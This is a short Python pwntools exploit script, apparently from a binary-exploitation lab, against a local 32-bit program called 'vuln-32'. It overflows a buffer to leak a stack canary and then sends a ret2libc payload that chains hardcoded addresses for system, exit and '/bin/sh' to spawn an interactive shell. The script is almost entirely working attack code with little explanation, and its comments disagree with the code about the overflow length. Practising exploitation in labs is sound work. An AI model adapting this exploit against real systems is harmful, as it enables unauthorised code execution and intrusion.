#!/usr/bin/env python3

from pwn import *

context.update(arch='i386', os='linux')


# Let's choose local vs remote
p = process("./vuln-32") 

p.recvuntil("Hello Hacker!")

###############################################################
# ret2libc payload
# WE can cause an overflow with 140 bytes + EIP 
payload = b'A'*100

p.sendline(payload)

#############################################################
# Following an example of leaking address when ASLR is active
p.recvuntil(b'A'*100)
output=p.recv(4)
leak = u32(output) 
log.info('output is {}'.format(output)) # The leaked value is printed.
leak -= 0xa
log.info('canary is {}'.format(hex(leak))) # The leaked value is printed.

#gdb-peda$ p system
#$1 = {<text variable, no debug info>} 0xf7c4c800 <system>
#gdb-peda$ p exit
#$2 = {<text variable, no debug info>} 0xf7c3bc90 <exit>
#gdb-peda$ find "/bin/sh"
#Searching for '/bin/sh' in: None ranges
#Found 3 results, display max 3 items:
#vulnerable : 0x804a008 ("/bin/sh")
#vulnerable : 0x804b008 ("/bin/sh")
# libc.so.6 : 0xf7db5faa ("/bin/sh")

system = 0xf7c4c800
exit   = 0xf7c3bc90
binsh  = 0x0804a008

payload = b'A'*100
payload += p32(leak)
payload += b'BBBB'
payload += b'CCCC'
payload += b'DDDD'
payload += p32(system)
payload += p32(exit)
payload += p32(binsh)

log.info('Re-exploiting the main().')

p.sendline(payload)
p.interactive()

